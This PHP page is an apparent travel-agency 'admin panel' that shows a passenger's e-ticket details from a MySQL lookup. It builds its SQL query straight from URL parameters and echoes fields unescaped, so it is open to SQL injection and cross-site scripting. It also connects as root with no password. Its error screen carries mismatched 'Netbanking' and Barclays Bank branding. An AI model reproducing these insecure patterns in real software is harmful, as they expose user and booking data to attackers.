<html>
<title>Centrepoint Travels - Admin Panel</title>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link href="Image/centerpoint.png" rel="icon">
    <link rel="stylesheet" href="./css/bootstrap.css">
    <link rel="stylesheet" href="./css/bootstrap.min.css">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link
        href="https://fonts.googleapis.com/css2?family=Encode+Sans:wght@300&family=Handlee&family=Jaldi&family=Titillium+Web:wght@300&display=swap"
        rel="stylesheet">
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>

</head>

<style>
h1 {
    font-size: 25px;
    text-align: center;
    font-family: 'Open Sans', sans-serif;
    padding-top: 150px;
}
</style>


<style>
.table {
    width: 50%;
    margin: auto;
    background: #4040bf;
    border: 2px solid green;
}

th {
    text-align: center;
    color: #fff;
}

.br {
    border: 0.7px solid black;
    width: 100%;
    display: block;
    color: #fff;
    padding: 3px;
}

.bor {
    border: 1px solid black;
}

.header {
    width: 100%;
    height: 50px;
    background: lightgray;
}

* {
    margin: 0;
    box-sizing: border-box;
}

body {
    font-family: "Lato", sans-serif;
}

.table {
    width: 80%;
    margin: auto;
    background: orange;
    border: 2px solid green;
}

th {
    text-align: center;
    color: #fff;
}

.br {
    border: 0.7px solid black;
    width: 100%;
    display: block;
    color: #fff;
    padding: 3px;
}

.bor {
    border: 1px solid black;
}
</style>

</head>



<body>


    <?php
$conn=new mysqli("localhost","root","","ticketing");
$ustar= $_GET['ustar'];
$pasti = $_GET['pasti'];

$name='';




$sql="select name,email,flier,number,booking,issue_by,issue_date,issue_time,departure_time,
arrival_time,weight,flight_number,d_first,arr_transit,airport1,a_abbre1,terms1,airport2,a_abbre2,terms2,airline1,time_depart,
time_arrival,checkin,d_travel,aircraft1,meal1,distance1,carbin,flight_numbs,d_transit,f_arrival,terminal3,a_abbre3,terms3,
terminal4,a_abbre4,terms4,airline2,time_transit,final_arrival,checkin1,d_travel1,aircraft2,meal2,distance2,type,
terminal4,a_abbre4,terms4,airline2,time_transit,final_arrival,checkin1,d_travel1,aircraft2,meal2,distance2,type,
current,initial,final,image,status,change_over_airport,change_over_abbre,change_over_time,airfare,boarding from datas where ustar='$ustar' and pasti='$pasti'";

$row=$conn->query($sql);
if($row->num_rows>0)
{

    
while($data=$row->fetch_assoc())
{?>
    <?php 
	$name=$data['name'];
	$image=$data['image'];
    $email=$data['email'];
    $flier=$data['flier'];
    $number=$data['number'];
    $booking=$data['booking'];
    $issue_by=$data['issue_by'];
    $issue_date=$data['issue_date'];
    $issue_time=$data['issue_time'];
    $departure_time=$data['departure_time'];
    $arrival_time=$data['arrival_time'];
    $weight=$data['weight'];
    $flight_number=$data['flight_number'];
    $d_first=$data['d_first'];
    $arr_transit=$data['arr_transit'];
    $airport1=$data['airport1'];
    $a_abbre1=$data['a_abbre1'];
    $terms1=$data['terms1'];
    $airport2=$data['airport2'];
    $a_abbre2=$data['a_abbre2'];
    $terms2=$data['terms2'];
    $airline1=$data['airline1'];
    $time_depart=$data['time_depart'];
    $time_arrival=$data['time_arrival'];
    $checkin=$data['checkin'];
    $d_travel=$data['d_travel'];
    $aircraft1=$data['aircraft1'];
    $meal1=$data['meal1'];
    $distance1=$data['distance1'];
    $carbin=$data['carbin'];
    $flight_numbs=$data['flight_numbs'];
    $d_transit=$data['d_transit'];
    $f_arrival=$data['f_arrival'];
    $terminal3=$data['terminal3'];
    $a_abbre3=$data['a_abbre3'];
    $terms3=$data['terms3'];
    $terminal4=$data['terminal4'];
    $a_abbre4=$data['a_abbre4'];
    $terms4=$data['terms4'];
    $airline2=$data['airline2'];
    $time_transit=$data['time_transit'];
    $final_arrival=$data['final_arrival'];
    $checkin1=$data['checkin1'];
    $d_travel1=$data['d_travel1'];
    $aircraft2=$data['aircraft2'];
    $meal2=$data['meal2'];
    $distance2=$data['distance2'];
    $type=$data['type'];
    $current=$data['current'];
    $initial=$data['initial'];
    $final=$data['final'];
    $status=$data['status'];
    $change_over_airport=$data['change_over_airport'];
    $change_over_abbre=$data['change_over_abbre'];
    $change_over_time=$data['change_over_time'];
    $airfare=$data['airfare'];
    $boarding=$data['boarding'];
	
	?>
    <div style="background-color:orange">
        <div class="container">
            <div class="row">
                <nav class="navbar navbar-orange">
                    <div class="col-md-6">
                        <h1 class="navbar-brand" href="#" style="color:#fff;font-family: 'Open Sans', sans-serif;">
                            <img src="./Image/centerpoint.png" width="80" height="80" style="float:left;"
                                class="d-inline-block align-top" alt="">
                            <marquee style="padding-top:15px">
                                <span
                                    style="margin-top:10px;display:block;float:left;margin-left:10px;font-family: 'Handlee', cursive;font-size:25px;">Welcome
                                    To Center Point Travels Admin Panel. This Panel Is Only Meant For Admin Purpose
                                    Only.
                                </span>
                            </marquee>
                        </h1>
                    </div>
                    <div class="col-md-6">
                        <ul class="nav justify-content-end">
                            <li class="nav-item">
                                <a class="nav-link"
                                    style="color:#fff;font-family: 'Open Sans', sans-serif;font-size:18px;"> <img
                                        src="Image/purepng.com-user-iconsymbolsiconsapple-iosiosios-8-iconsios-8-721522596134a4bio.png"
                                        width="100" height="100">Welcome:<?=$data ['name']?></a>
                            </li>

                            <li class="nav-item">
                                <a class="nav-link" href="secured-login.php"
                                    style="color:#fff;font-family: 'Open Sans', sans-serif;font-size:18px;padding-top:42px;">Logout</a>
                            </li>
                        </ul>
                </nav>
            </div>
        </div>
    </div>


    <div style="height:50px"></div>



    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <table>
                    <tbody>
                        <tr style="width:100%">
                            <th style="border:4px dotted #000000;width:950px;border-right:1px dotted #ffffff;">
                                <p
                                    style="font-size:30px;color:#000000;text-align:center;text-indent:10em;font-family: 'Encode Sans', sans-serif;">
                                    E-Ticket Details</p>
                                <p style="text-align:left"> <span
                                        style="color:#000000;font-size:40px;font-family: 'Encode Sans', sans-serif;text-align:left;"></span>
                                </p>
                                <ul class="nav">
                                    <li class="nav-item">
                                        <a class="nav-link">
                                            <p
                                                style="font-size:14px;color:#000000;font-family: 'Encode Sans', sans-serif;padding-top:20px;text-align:left;text-indent:2em;">
                                                <img src="upload1/<?=$data ['image']?>" width="150" height="100">
                                            </p>
                                        </a>
                                    </li>
                                    <li class="nav-item">
                                        <a class="nav-link">
                                            <p
                                                style="font-size:40px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;padding-top:40px;">
                                                <?=$data ['flier']?>
                                            </p>
                                        </a>
                                    </li>
                                </ul>
                            </th>
                            <th style="border:1px dotted #5d8aa8;width:300px;">
                                <p style="">
                                    <soan style="font-size:20px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                        RESERVATION: <?=$data ['status']?></span><br><br><img
                                            src="Image/chart-checkpoint.png" style="width:40%">
                                </p>
                            </th>
                        </tr>
                        <table>
                            <tr>
                                <th style="border:1px dotted #5d8aa8;border-right:1px solid #ffffff;width:300px;">
                                    <p
                                        style="color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;padding-top:20px;text-indent:4em;;">
                                        Booking Number: </p>
                                    <p
                                        style="color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;;">
                                        Date Of Booking:</p>
                                    <p
                                        style="color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;;">
                                        Time Of Booking: </p>
                                </th>
                                <th style="border:1px dotted #5d8aa8;border-left:1px solid #ffffff;width:300px;">
                                    <p style="padding-top:10px;text-indent:4em;">
                                    <div style="background-color:#a9a9a9;width:120px;margin: auto;">
                                        <p
                                            style="font-family: 'Encode Sans', sans-serif;text-align:left;color:#000000;text-indent:1em;">
                                            <?=$data ['number']?></p>
                                    </div>
                                    </p>
                                    <p style="text-align:left;text-indent:4em;">
                                    <div style="background-color:#a9a9a9;width:120px;margin: auto;">
                                        <p
                                            style="font-family: 'Encode Sans', sans-serif;text-align:left;color:#000000;text-indent:1em;">
                                            <?=$data ['issue_date']?></p>
                                    </div>
                                    </p>
                                    <p style="text-align:left;text-indent:4em;;">
                                    <div style="background-color:#a9a9a9;width:120px;margin: auto;">
                                        <p
                                            style="color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:1em;">
                                            <?=$data ['issue_time']?></p>
                                    </div>
                                    </p>
                                </th>
                                <th style="border:1px dotted #5d8aa8;border-right:1px solid #ffffff;width:300px;">
                                    <p
                                        style="color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;padding-top:20px;text-indent:4em;;">
                                        Name Of Airline: </p>
                                    <p
                                        style="color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;;">
                                        Passenger Reference:</p>

                                </th>
                                <th style="border:1px dotted #5d8aa8;border-left:1px solid #ffffff;width:300px;">
                                    <p style="padding-top:10px;text-indent:4em;">
                                    <div style="background-color:#a9a9a9;width:120px;margin: auto;">
                                        <p
                                            style="font-family: 'Encode Sans', sans-serif;text-align:left;color:#000000;text-indent:1em;">
                                            <?=$data ['flier']?></p>
                                    </div>
                                    </p>
                                    <p style="text-align:left;text-indent:4em;">
                                    <div style="background-color:#a9a9a9;width:120px;margin: auto;">
                                        <p
                                            style="font-family: 'Encode Sans', sans-serif;text-align:left;color:#000000;text-indent:1em;">
                                            1 Adult</p>
                                    </div>
                                    </p>
                                </th>
                            </tr>
                        </table>
                        <table>
                            <tr>
                                <th style="width:1200px;border:1px dotted #5d8aa8;">
                                    <div id="Sign In" align="left">
                                        <p style="text-align:left;text-indent:3em;padding-top:20px;"> <span
                                                style="font-size:15px;font-family: 'Encode Sans', sans-serif;color:#000000;">
                                                PREPARED FOR:</span><br>
                                            &nbsp &nbsp &nbsp &nbsp &nbsp<span
                                                style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;">
                                                <?=$data ['name']?></span></p>

                                        &nbsp &nbsp &nbsp &nbsp <span
                                            style="font-size:13px;font-family: 'Titillium Web', sans-serif;color:#000000;text-align:left;">
                                            If you need to change your trip, please contact our customer service.</span>
                                        <hr style="border-top:2px dotted black;width:800px;margin:2px;;">
                                    </div>
                                </th>
                            </tr>
                        </table>
                        <table>
                            <tr>
                                <th style="width:600px;border:1px dotted #5d8aa8;border-bottom:1px solid white;">
                                    <div id="Sign In" align="left">
                                        <p style="text-align:left;text-indent:3em;padding-top:20px;"> <img
                                                src="Image/plane.png" style="width:30px;height:30px;">
                                            &nbsp<span
                                                style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;">Departure
                                                Date: <?=$data ['d_first']?></span></p>
                                </th>
                                <th
                                    style="width:600px;border:1px dotted #5d8aa8;border-bottom:1px solid white;border-bottom:1px dotted #5d8aa8;#5d8aa8">
                                    <div id="Sign In" align="left">
                                        <p style="text-align:left;text-indent:3em;padding-top:20px;"> <img
                                                src="Image/plane.png" style="width:30px;height:30px;">
                                            &nbsp<span
                                                style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;">Arrival
                                                On Transit
                                                Date: <?=$data ['arr_transit']?></span></p>
                                </th>
            </div>
            <table>
                <tr>
                    <td
                        style="background-color:#f0f5f5;width:250px;height:200px;border-bottom-left-radius: 25px;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;border-right:1px dotted #000000;">
                        <p style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:2em;">
                            <?=$data ['airline1']?></p>
                        <p style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:2em;">
                            <?=$data ['flight_number']?></p>
                        <p style="font-size:13px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:3em;">
                            Duration:<br>&nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                            <?=$data ['d_travel']?></p>
                        <p style="font-size:13px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:3em;">
                            Carbin:<br> &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                            <?=$data ['carbin']?></p>
                        <p style="font-size:13px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:3em;">
                            Status:<br> &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                            <?=$data ['status']?></p>
                    </td>

                    <td style="width:10px;height:200px;">
                    </td>
                    <td style="width:950px;height:200px;border:1px dotted #000000;border-left:1px dotted #000000;">
                        <table>
                            <tr>
                                <td style="width:500px;height:50px;border:1px dotted #000000;">
                                    <div id="Sign In" align="center">
                                        <p style="padding-top:20px;"><span
                                                style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;">
                                                <?=$data ['a_abbre1']?></span> <i class="fa fa-arrow-right"
                                                aria-hidden="true"></i> <?=$data ['a_abbre2']?>
                                        </p>
                                        <p style=""><span
                                                style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;">
                                                <?=$data ['airport1']?> </span>
                                            <i class="fa fa-arrow-right" aria-hidden="true"></i>
                                            <?=$data ['airport2']?>
                                        </p>
                                    </div>
                                </td>
                                <td
                                    style="width:243px;height:50px;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;border-right:1px dotted #000000;">
                                    <div id="Sign In" align="center">
                                        <p
                                            style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;">
                                            Aircraft:<br>
                                            &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                                            <?=$data ['aircraft1']?>
                                        </p>
                                    </div>
                                </td>
                                <table>
                                    <tr>
                                        <td style="width:250px;height:200px;border:1px dotted #000000;">
                                            <div id="Sign In" align="center">
                                                <p
                                                    style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                                    Departing Time:<br>
                                                    <?=$data ['time_depart']?></p>
                                                <p
                                                    style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                                    Teminal:<br> <?=$data ['terms1']?>
                                                </p>
                                                <p style="color:#ffffff">Teminal:<br>
                                                    <?=$data ['terms2']?></p>
                                            </div>
                                        </td>
                                        <td style="width:247px;height:200px;border:1px dotted #000000;">
                                            <div id="Sign In" align="center">
                                                <p
                                                    style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                                    Arrival Time (On Transit):<br>
                                                    <?=$data ['time_arrival']?></p>
                                                <p
                                                    style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                                    Teminal:<br> <?=$data ['terms2']?>
                                                </p>
                                                <p style="color:#ffffff">Teminal:<br>
                                                    <?=$data ['terms2']?></p>
                                            </div>
                                        </td>
                                        <td style="width:243px;height:200px;border:1px #ffffff;">
                                            <div id="Sign In" align="center">
                                                <p
                                                    style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;">
                                                    Distance :
                                                    <?=$data ['distance1']?></p>
                                                <p
                                                    style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;">
                                                    Meals: <?=$data ['meal1']?>
                                                </p>
                                                <p style="color:#ffffff">Teminal:
                                                    <?=$data ['terms2']?></p>
                                            </div>
                                        </td>
                                    </tr>
                                </table>
                            <tr>
                        </table>
                    </td>
                </tr>
            </table>
            </th>
            </tr>
            </table>
            </tbody>
            </table>
            <table>
                <tr>
                    <td
                        style="width:400px;border-right:1px dotted #000000;background-color:#f0f5f5;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;">
                        <p
                            style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                            Passenger Name:</p>
                    </td>
                    <td
                        style="width:400px;border-right:1px dotted #000000;background-color:#f0f5f5;height:10px;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;">
                        <p
                            style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                            Seats:</p>
                    </td>
                    <td
                        style="width:400px;background-color:#f0f5f5;height:10px;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;border-right:1px dotted #000000;">
                        <p
                            style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                            eTicket (Receipts):</p>
                    </td>
                    <br>
                <tr>
                <tr>
                    <td
                        style="width:400px;background-color:#ffffff;border-right:1px doted #000000;border-bottom:1px dotted #000000;border-left:1px dotted #000000;">
                        <p
                            style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;font-weight:bold;">
                            <?=$data ['name']?></p>
                    </td>
                    <td
                        style="width:400px;border:1px dotted #5d8aa8;background-color:#ffffff;border-right:1px dotted #000000;border-bottom:1px dotted #000000;">
                        <p
                            style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                            Check-In-Required</p>
                    </td>
                    <td
                        style="width:400px;background-color:#ffffff;border-right:1px dotted #000000;border-bottom:1px dotted #000000;">
                        <p
                            style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                            <?=$data ['number']?></p>
                    </td>
                <tr>
            </table>
            <table>
                <tr>
                    <td style="width:1200px;background-color:#ffffff;border:1px dotted #000000;">
                        <p
                            style="text-align:center;font-size:10px;color:#e68a00;font-weight:bold;font-family: 'Encode Sans', sans-serif;padding-top:20px;">
                            <span style="">Change Over Flight At: <?=$data ['change_over_airport']?>
                                <?=$data ['change_over_abbre']?> &nbsp Time Of Change
                                Over:<?=$data ['change_over_time']?>
                    </td>
                </tr>
            </table>
            <table>
                <tr>
                    <th style="width:600px;border:1px dotted #000000;">
                        <div id="Sign In" align="left">
                            <p style="text-align:left;text-indent:3em;padding-top:20px;"> <img src="Image/plane.png"
                                    style="width:30px;height:30px;">
                                &nbsp<span
                                    style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;">Departure
                                    Date: <?=$data ['d_transit']?></span></p>
                    </th>
                    <th
                        style="width:600px;border:1px dotted #000000;border-bottom:1px solid #000000;border-bottom:1px dotted #000000;#5d8aa8;border-right:1px dotted #000000;">
                        <div id="Sign In" align="left">
                            <p style="text-align:left;text-indent:3em;padding-top:20px;"> <img src="Image/plane.png"
                                    style="width:30px;height:30px;">
                                &nbsp<span
                                    style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;">Arrival

                                    Date: <?=$data ['f_arrival']?></span></p>
                    </th>
        </div>
        <table>
            <tr>
                <td style="background-color:#f0f5f5;width:250px;height:200px;border-bottom-left-radius: 25px;">
                    <p style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:2em;">
                        <?=$data ['airline2']?></p>
                    <p style="font-size:18px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:2em;">
                        <?=$data ['flight_numbs']?></p>
                    <p style="font-size:13px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:3em;">
                        Duration:<br>&nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                        <?=$data ['d_travel1']?></p>
                    <p style="font-size:13px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:3em;">
                        Carbin:<br> &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                        <?=$data ['carbin']?></p>
                    <p style="font-size:13px;font-family: 'Encode Sans', sans-serif;color:#000000;text-indent:3em;">
                        Status:<br> &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                        <?=$data ['status']?></p>
                </td>

                <td style="width:10px;height:200px;">
                </td>
                <td style="width:900px;height:200px;border:1px dotted #000000;border-left:1px dotted #000000;">
                    <table>
                        <tr>
                            <td style="width:500px;height:50px;border:1px dotted #000000;">
                                <div id="Sign In" align="center">
                                    <p style="padding-top:20px;"><span
                                            style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;">
                                            <?=$data ['a_abbre3']?></span> <i class="fa fa-arrow-right"
                                            aria-hidden="true"></i> <?=$data ['a_abbre4']?>
                                    </p>
                                    <p style=""><span
                                            style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;">
                                            <?=$data ['terminal3']?> </span>
                                        <i class="fa fa-arrow-right" aria-hidden="true"></i>
                                        <?=$data ['terminal4']?>
                                    </p>
                                </div>
                            </td>
                            <td style="width:243px;height:50px;border:1px #ffffff;">
                                <div id="Sign In" align="center">
                                    <p
                                        style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;">
                                        Aircraft:<br>
                                        &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp &nbsp
                                        <?=$data ['aircraft1']?>
                                    </p>
                                </div>
                            </td>
                            <table>
                                <tr>
                                    <td style="width:250px;height:200px;border:1px dotted #000000;">
                                        <div id="Sign In" align="center">
                                            <p
                                                style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                                Departing Time:<br>
                                                <?=$data ['time_transit']?></p>
                                            <p
                                                style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                                Teminal:<br> <?=$data ['terms3']?>
                                            </p>
                                            <p style="color:#ffffff">Teminal:<br>
                                                <?=$data ['terms4']?></p>
                                        </div>
                                    </td>
                                    <td style="width:247px;height:200px;border:1px dotted #000000;">
                                        <div id="Sign In" align="center">
                                            <p
                                                style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                                Arrival Time:<br>
                                                <?=$data ['final_arrival']?></p>
                                            <p
                                                style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;">
                                                Teminal:<br> <?=$data ['terms4']?>
                                            </p>
                                            <p style="color:#ffffff">Teminal:<br>
                                                <?=$data ['terms2']?></p>
                                        </div>
                                    </td>
                                    <td style="width:243px;height:200px;border:1px #ffffff;">
                                        <div id="Sign In" align="center">
                                            <p
                                                style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;">
                                                Distance :
                                                <?=$data ['distance2']?></p>
                                            <p
                                                style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;">
                                                Meals: <?=$data ['meal2']?>
                                            </p>
                                            <p style="color:#ffffff">Teminal:
                                                <?=$data ['terms2']?></p>
                                        </div>
                                    </td>
                                </tr>
                            </table>
                        <tr>
                    </table>
                </td>
            </tr>
        </table>
        </th>
        </tr>
        </table>
        <table>
            <tr>
                <td
                    style="width:400px;border-right:1px dotted #000000;background-color:#f0f5f5;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;height:10px;">
                    <p
                        style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                        Passenger Name:</p>
                </td>
                <td
                    style="width:400px;border-left:1px solid #000000;border-right:1px dotted #000000;background-color:#f0f5f5;height:10px;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;border-right:1px dotted #000000;">
                    <p
                        style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                        Seats:</p>
                </td>
                <td
                    style="width:400px;background-color:#f0f5f5;height:10px;border-right:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;border-right:1px dotted #000000;">
                    <p
                        style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                        eTicket (Receipts):</p>
                </td>
                <br>
            <tr>
            <tr>
                <td
                    style="width:400px;background-color:#ffffff;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;border-right:1px dotted #000000;">
                    <p
                        style="font-size:15px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;font-weight:bold;">
                        <?=$data ['name']?></p>
                </td>
                <td
                    style="width:400px;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;border-right:1px dotted #000000;">
                    <p
                        style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                        Check-In-Required</p>
                </td>
                <td
                    style="width:400px;background-color:#ffffff;border-bottom:1px dotted #000000;height:10px;border-left:1px dotted #000000;border-top:1px dotted #000000;border-right:1px dotted #000000;">
                    <p
                        style="font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-align:left;text-indent:4em;padding-top:8px;">
                        <?=$data ['number']?></p>
                </td>
            <tr>
        </table>
        <table>
            <tr>
                <td style="width:367px;background-color:#ffffff;border:1px dotted #000000;">
                    <p
                        style="padding-top:20px;font-size:13px;color:#000000;font-family: 'Encode Sans', sans-serif;text-indent:4em;">
                        Ticket Payment: <b><?=$data ['current']?> <?=$data ['final']?></b></p>
                </td>
            </tr>
            <table>
    </div>
    </div>
    </div>

    <p style="text-align:center"><a href="generate-flight-ticket-details.php?email=<?=$email;?>&search=flight-ticket" class="btn btn-success"
            style="width:250px;height:40px;">Print Out Flight Ticket</a></p><br><br>
            <p style="text-align:center"><a href="boarding-pass.php?email=<?=$email;?>&search=boarding-pass" class="btn btn-success"
            style="width:250px;height:40px;">Print Out Boarding Pass</a></p><br><br>
    <p style="font-size:25px;font-family: 'Source Sans Pro', sans-serif;text-align:center"> Thank You For Using Clear
        Point Travels. Hope To See You Again!!</p>
    <?php
}
}
else
{?>


    <!---  HEADER  END------------->

    <div class="section"><br><br><br><br><br><br>
        <div
            style="width:400px;height:230px;border:1px solid black; background-color:white;margin:auto;padding:5px;float:center;">
            <div id="Sign-In" align="center"><br><br>
                <p style="color:#001f4d"><span
                        style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;">Incorrect Account Holder or
                        O.T.P Password.</span></p>
                <p style="color:#001f4d"><span
                        style="font-family: 'Source Sans Pro', sans-serif;font-size:20px;">Contact your Account
                        Officer.</span></p>
                <table>
                    <tr>
                        <td
                            style="border:2px solid green;background-color:green;width:200px;height:40px;text-align:center;">
                            <a href="secured-login.php" style="color:#ffffff;text-decoration:none;">Return To
                                Netbanking</a>
                        </td>
                    </tr>
                </table>
            </div>
        </div>
    </div>

    <div style="height:90px"></div>
    <div id="Sign-In" align="center">
        <div
            style="width:1200px;height:60px;border:2px solid black; background-color:#800000;margin:auto;padding:10px;font-size:20px;color:#ffffff;font-family: 'Source Sans Pro', sans-serif;">
            © Copy Right Barclays Bank Plc. All Right Reserved.
        </div>
    </div>

    <?php
}







?>


</body>

</html>